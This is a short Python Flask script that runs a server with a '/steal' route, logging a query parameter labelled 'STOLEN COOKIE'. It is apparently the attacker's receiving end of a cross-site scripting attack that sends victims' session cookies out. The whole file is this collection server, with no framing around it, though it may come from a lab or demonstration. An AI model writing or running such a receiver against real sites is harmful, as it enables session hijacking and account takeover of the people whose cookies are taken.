from flask import Flask, request

app = Flask(__name__)


@app.route("/steal")
def steal():
    stolen = request.args.get("c")
    print("=" * 50)
    print("STOLEN COOKIE:", stolen)
    print("=" * 50)
    return "", 200


if __name__ == "__main__":
    app.run(port=9000, debug=True)